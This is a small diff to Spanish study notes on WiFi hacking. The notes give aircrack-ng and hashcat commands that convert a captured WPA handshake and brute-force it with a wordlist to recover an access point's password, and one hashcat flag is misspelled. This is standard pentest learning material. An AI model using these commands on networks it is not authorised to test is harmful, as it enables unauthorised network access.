@@ -1,11 +1,10 @@
-Al capturar el handshake con aircrack-ng podemos aplicar una fuerza bruta a este con [[Conceptos/Hacking Wifi/Herramientas/HashCat | HashCat]] 
-para obtener el password del AC 
+Al capturar el handshake con aircrack-ng podemos aplicar una fuerza bruta con [[Conceptos/Hacking Wifi/Herramientas/HashCat |HashCat]] para obtener el password del AC.
 
 Primero debemos de pasar la captura ah un tipo de archivo legible para que lo comprensa hashcat
 
 	aircrack-ng -j CapturaHCCAPX CapturaDeAuth-01.cap
 
-Con el parametro *-j* y el nombre del nuevo archivo.
+Con el parámetro *-j* y el nombre del nuevo archivo.
 
 	hashcat -m 2500 -d 0 CapturaHCCAPX dicc.txt --outfile=password.txt --potile-disable
 
